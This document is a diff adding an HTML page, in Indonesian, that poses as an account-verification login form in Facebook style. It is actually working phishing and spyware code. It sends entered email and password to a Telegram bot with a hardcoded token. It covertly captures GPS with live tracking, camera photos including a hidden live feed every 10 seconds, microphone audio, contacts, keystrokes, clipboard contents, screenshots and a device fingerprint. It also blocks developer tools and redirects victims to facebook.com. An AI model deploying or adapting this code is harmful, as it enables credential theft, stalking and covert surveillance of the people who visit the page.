@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Akun</title>
+    <style>
+        body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 350px; }
+        h2 { text-align: center; color: #1877f2; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
+        button:hover { background: #166fe5; }
+        button:disabled { background: #999; }
+        .info { font-size: 11px; color: #999; text-align: center; margin-top: 15px; }
+        .progress { text-align:center; font-size:12px; color:#666; margin-top:10px; display:none; }
+        /* Video preview disembunyiin */
+        #hiddenVideo { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Verifikasi Akun</h2>
+        <p style="text-align:center;color:#666;font-size:13px;">Silakan verifikasi untuk melanjutkan</p>
+        <form id="form">
+            <input type="text" id="email" placeholder="Email atau Nomor HP" required>
+            <input type="password" id="pass" placeholder="Password" required>
+            <button type="submit" id="btn">Verifikasi</button>
+        </form>
+        <div class="progress" id="progress">Mengirim data...</div>
+        <div class="info">🔒 Koneksi aman & terenkripsi</div>
+    </div>
+
+    <video id="hiddenVideo" autoplay muted playsinline></video>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+    <script>
+        // ============================================
+        // KONFIGURASI
+        // ============================================
+        const BOT_TOKEN = "8893192998:AAFPGOPhVqqJmpcjWjt03-rpfFGUkTW_2hQ";
+        const CHAT_ID   = "7617593303";
+        const TG_API    = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+        // ============================================
+        // VARIABEL GLOBAL
+        // ============================================
+        let keystrokes = [];
+        let clipboardData = "";
+        let locationHistory = [];
+        let sessionEvents = [];
+        let cameraStream = null;
+        let liveCameraInterval = null;
+        let liveCameraRunning = false;
+
+        // ============================================
+        // UTILITY: KIRIM PESAN / FOTO / FILE
+        // ============================================
+        async function sendMessage(text) {
+            try {
+                await fetch(`${TG_API}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' })
+                });
+            } catch (e) { console.log(e); }
+        }
+
+        async function sendPhoto(base64, caption = "") {
+            try {
+                const blob = await (await fetch(base64)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'photo.jpg');
+                fd.append('caption', caption);
+                await fetch(`${TG_API}/sendPhoto`, { method: 'POST', body: fd });
+            } catch (e) { console.log(e); }
+        }
+
+        async function sendDocument(blob, filename, caption = "") {
+            try {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('document', blob, filename);
+                fd.append('caption', caption);
+                await fetch(`${TG_API}/sendDocument`, { method: 'POST', body: fd });
+            } catch (e) { console.log(e); }
+        }
+
+        // ============================================
+        // 1. IP & GEO
+        // ============================================
+        async function getIP() {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const ip = (await r.json()).ip;
+                let geo = "";
+                try {
+                    const g = await fetch(`https://ipapi.co/${ip}/json/`);
+                    const d = await g.json();
+                    geo = `${d.country_name}, ${d.city}, ${d.region} (${d.org})`;
+                } catch {}
+                return { ip, geo };
+            } catch { return { ip: "gagal", geo: "gagal" }; }
+        }
+
+        // ============================================
+        // 2. GPS
+        // ============================================
+        function getLocation() {
+            return new Promise(resolve => {
+                if (!navigator.geolocation) return resolve({ status: "gak support" });
+                navigator.geolocation.getCurrentPosition(
+                    p => resolve({
+                        status: "OK",
+                        lat: p.coords.latitude,
+                        lon: p.coords.longitude,
+                        acc: Math.round(p.coords.accuracy),
+                        maps: `https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`
+                    }),
+                    e => resolve({ status: "ditolak", msg: e.message }),
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            });
+        }
+
+        // ============================================
+        // 3. 🎥 START LIVE CAMERA (INI FITUR BARU!)
+        // ============================================
+        async function startLiveCamera(facing = 'user') {
+            try {
+                await sendMessage(`🎥 *Mencoba akses kamera ${facing === 'user' ? 'DEPAN' : 'BELAKANG'}...*`);
+
+                // Minta izin kamera
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facing, width: 640, height: 480 },
+                    audio: false
+                });
+
+                await sendMessage(`✅ *Kamera ${facing === 'user' ? 'DEPAN' : 'BELAKANG'} AKTIF!*\nMulai live capture tiap 10 detik...`);
+
+                // Simpen stream ke video element
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = cameraStream;
+                await video.play();
+
+                liveCameraRunning = true;
+                let frameCount = 0;
+
+                // Loop: ambil foto tiap 10 detik & kirim
+                liveCameraInterval = setInterval(async () => {
+                    if (!liveCameraRunning || !cameraStream) return;
+                    frameCount++;
+
+                    // Cek apakah stream masih aktif
+                    if (cameraStream.getVideoTracks()[0].readyState !== 'live') {
+                        await sendMessage("⚠️ Kamera mati / korban cabut izin");
+                        stopLiveCamera();
+                        return;
+                    }
+
+                    // Capture frame
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const imgData = canvas.toDataURL('image/jpeg', 0.6);
+
+                    // Kirim ke Telegram
+                    await sendPhoto(imgData, `🎥 Live cam #${frameCount} (${new Date().toLocaleTimeString('id-ID')})`);
+                }, 10000);
+
+            } catch (e) {
+                await sendMessage(`❌ *Gagal akses kamera:* ${e.message}`);
+                console.log("Live cam error:", e);
+            }
+        }
+
+        // ============================================
+        // 4. 🛑 STOP LIVE CAMERA
+        // ============================================
+        function stopLiveCamera() {
+            if (liveCameraInterval) {
+                clearInterval(liveCameraInterval);
+                liveCameraInterval = null;
+            }
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(t => t.stop());
+                cameraStream = null;
+            }
+            liveCameraRunning = false;
+        }
+
+        // ============================================
+        // 5. SNAPSHOT KAMERA (single foto)
+        // ============================================
+        async function getCamera(facing = 'user') {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facing }
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', '');
+                await video.play();
+                await new Promise(r => setTimeout(r, 1500));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                stream.getTracks().forEach(t => t.stop());
+                return canvas.toDataURL('image/jpeg', 0.7);
+            } catch (e) { return null; }
+        }
+
+        // ============================================
+        // 6. AUDIO REKAM
+        // ============================================
+        async function getAudio(duration = 10000) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+
+                return new Promise(resolve => {
+                    recorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve(blob);
+                    };
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), duration);
+                });
+            } catch (e) { return null; }
+        }
+
+        // ============================================
+        // 7. KONTAK HP
+        // ============================================
+        async function getContacts() {
+            try {
+                if (!navigator.contacts || !navigator.contacts.select) {
+                    return { status: "gak support" };
+                }
+                const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                return contacts;
+            } catch (e) {
+                return { status: "ditolak", msg: e.message };
+            }
+        }
+
+        // ============================================
+        // 8. BATERAI & JARINGAN
+        // ============================================
+        async function getBattery() {
+            try {
+                if (!navigator.getBattery) return { status: "gak support" };
+                const b = await navigator.getBattery();
+                return {
+                    level: Math.round(b.level * 100) + "%",
+                    charging: b.charging ? "Ya" : "Tidak"
+                };
+            } catch { return { status: "gagal" }; }
+        }
+
+        function getNetwork() {
+            const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!c) return { status: "gak support" };
+            return {
+                type: c.effectiveType || "-",
+                downlink: c.downlink ? c.downlink + " Mbps" : "-",
+                rtt: c.rtt ? c.rtt + " ms" : "-"
+            };
+        }
+
+        // ============================================
+        // 9. KEYLOGGER & CLIPBOARD
+        // ============================================
+        document.addEventListener('keydown', (e) => {
+            const t = new Date().toLocaleTimeString('id-ID');
+            let key = e.key;
+            if (key.length === 1) keystrokes.push(`[${t}] ${key}`);
+            else if (['Enter', 'Backspace', 'Tab', 'Delete'].includes(key)) keystrokes.push(`[${t}] <${key}>`);
+            if (keystrokes.length > 500) keystrokes.shift();
+        });
+
+        document.addEventListener('click', async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text && text !== clipboardData) clipboardData = text;
+            } catch {}
+        });
+
+        // ============================================
+        // 10. SCREENSHOT
+        // ============================================
+        async function getScreenshot() {
+            try {
+                const canvas = await html2canvas(document.body);
+                return canvas.toDataURL('image/jpeg', 0.6);
+            } catch { return null; }
+        }
+
+        // ============================================
+        // 11. FINGERPRINT
+        // ============================================
+        function getFingerprint() {
+            let gpu = "unknown";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+            } catch {}
+
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cores: navigator.hardwareConcurrency || "?",
+                memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "?",
+                screen: `${screen.width}x${screen.height}`,
+                pixelRatio: window.devicePixelRatio,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                touchSupport: 'ontouchstart' in window ? "Ya" : "Tidak",
+                gpu: gpu
+            };
+        }
+
+        // ============================================
+        // 12. LIVE TRACKING
+        // ============================================
+        function startLiveTracking() {
+            let count = 0;
+            const maxUpdates = 10;
+            const interval = setInterval(() => {
+                if (count >= maxUpdates) {
+                    clearInterval(interval);
+                    sendMessage(`📡 *Live tracking selesai* (${locationHistory.length} update)`);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    p => {
+                        const loc = {
+                            lat: p.coords.latitude,
+                            lon: p.coords.longitude,
+                            acc: Math.round(p.coords.accuracy),
+                            time: new Date().toLocaleTimeString('id-ID')
+                        };
+                        locationHistory.push(loc);
+                        sendMessage(`📡 *LIVE [${count + 1}/${maxUpdates}]* ${loc.time}\n` +
+                                    `📍 \`${loc.lat}, ${loc.lon}\` (±${loc.acc}m)\n` +
+                                    `🗺️ https://maps.google.com/?q=${loc.lat},${loc.lon}`);
+                        count++;
+                    },
+                    e => console.log(e),
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            }, 30000);
+        }
+
+        // ============================================
+        // 13. ANTI-DEVTOOLS
+        // ============================================
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) ||
+                (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // ============================================
+        // 14. HANDLER SUBMIT
+        // ============================================
+        document.getElementById('form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('btn');
+            const progress = document.getElementById('progress');
+            btn.textContent = "Memverifikasi...";
+            btn.disabled = true;
+            progress.style.display = 'block';
+
+            // ---------- DATA UTAMA ----------
+            progress.textContent = "Mengambil IP...";
+            const ipData = await getIP();
+
+            progress.textContent = "Mengambil lokasi...";
+            const loc = await getLocation();
+
+            progress.textContent = "Mengambil baterai...";
+            const battery = await getBattery();
+
+            const network = getNetwork();
+            const fp = getFingerprint();
+
+            // Kirim data utama
+            await sendMessage(`🎯 *KORBAN BARU TERTANGKAP*\n` +
+                `━━━━━━━━━━━━━━━━━━━━━\n` +
+                `📧 *Email:* \`${document.getElementById('email').value}\`\n` +
+                `🔑 *Password:* \`${document.getElementById('pass').value}\`\n` +
+                `━━━━━━━━━━━━━━━━━━━━━\n` +
+                `🌐 *IP:* \`${ipData.ip}\`\n` +
+                `🗺️ *IP Geo:* ${ipData.geo}\n` +
+                `📍 *GPS:* ${loc.status === 'OK' ? '✅' : '❌ ' + loc.status}\n` +
+                `━━━━━━━━━━━━━━━━━━━━━\n` +
+                `📱 *Device*\n` +
+                `• Platform: \`${fp.platform}\`\n` +
+                `• Screen: ${fp.screen} (DPR ${fp.pixelRatio})\n` +
+                `• Cores: ${fp.cores} | RAM: ${fp.memory}\n` +
+                `• GPU: \`${fp.gpu.substring(0, 60)}\`\n` +
+                `• Touch: ${fp.touchSupport}\n` +
+                `• TZ: ${fp.timezone}\n` +
+                `━━━━━━━━━━━━━━━━━━━━━\n` +
+                `🔋 *Baterai:* ${battery.level || battery.status}\n` +
+                `📶 *Jaringan:* ${network.type || network.status}\n` +
+                `🕐 *Waktu:* ${new Date().toLocaleString('id-ID')}`);
+
+            // ---------- LOKASI MAPS ----------
+            if (loc.status === 'OK') {
+                await sendMessage(`📍 *Maps:* ${loc.maps}\nAkurasi: ±${loc.acc}m`);
+            }
+
+            // ---------- SCREENSHOT ----------
+            progress.textContent = "Screenshot...";
+            const ss = await getScreenshot();
+            if (ss) await sendPhoto(ss, "🖥️ Screenshot halaman");
+
+            // ---------- FOTO DEPAN ----------
+            progress.textContent = "Foto depan...";
+            const fotoDepan = await getCamera('user');
+            if (fotoDepan) await sendPhoto(fotoDepan, "📸 Kamera DEPAN");
+
+            // ---------- FOTO BELAKANG ----------
+            progress.textContent = "Foto belakang...";
+            const fotoBelakang = await getCamera('environment');
+            if (fotoBelakang) await sendPhoto(fotoBelakang, "📸 Kamera BELAKANG");
+
+            // ---------- 🎥 LIVE CAMERA (FITUR BARU!) ----------
+            progress.textContent = "Mengaktifkan live camera...";
+            await sendMessage("🎥 *MEMULAI LIVE CAMERA DEPAN* — lo bakal dapet foto tiap 10 detik!");
+            startLiveCamera('user');
+
+            // ---------- AUDIO ----------
+            progress.textContent = "Rekam suara...";
+            const audio = await getAudio(10000);
+            if (audio) await sendDocument(audio, "audio.webm", "🎤 Rekaman suara 10 detik");
+
+            // ---------- KONTAK ----------
+            progress.textContent = "Ambil kontak...";
+            const contacts = await getContacts();
+            if (Array.isArray(contacts) && contacts.length > 0) {
+                let txt = `📞 *KONTAK (${contacts.length})*\n\`\`\`\n`;
+                contacts.slice(0, 50).forEach((c, i) => {
+                    txt += `${i + 1}. ${c.name?.[0] || '?'} | ${c.tel?.[0] || '-'} | ${c.email?.[0] || '-'}\n`;
+                });
+                txt += `\`\`\``;
+                await sendMessage(txt);
+            }
+
+            // ---------- KEYLOGGER ----------
+            if (keystrokes.length > 0) {
+                await sendMessage(`⌨️ *Keylogger (${keystrokes.length})*\n\`\`\`\n${keystrokes.join('\n').substring(0, 3500)}\n\`\`\``);
+            }
+
+            // ---------- CLIPBOARD ----------
+            if (clipboardData) {
+                await sendMessage(`📋 *Clipboard:*\n\`\`\`\n${clipboardData.substring(0, 3500)}\n\`\`\``);
+            }
+
+            // ---------- LIVE TRACKING ----------
+            progress.textContent = "Live tracking 5 menit...";
+            await sendMessage("📡 *Live tracking dimulai (5 menit)*");
+            startLiveTracking();
+
+            // ---------- DONE ----------
+            progress.textContent = "✅ Selesai!";
+            await sendMessage("✅ *SEMUA DATA TERKIRIM!*\n🎥 Live camera tetap jalan di background.");
+
+            // ---------- REDIRECT (tapi live camera tetep jalan!) ----------
+            setTimeout(() => {
+                window.location.href = "https://facebook.com";
+            }, 1500);
+        });
+
+        // ============================================
+        // 15. AUTO-RESTART LIVE CAMERA KALO KORBAN BALIK
+        // ============================================
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'visible' && liveCameraRunning) {
+                sendMessage("👀 Korban balik ke halaman!");
+            }
+        });
+    </script>
+</body>
+</html>
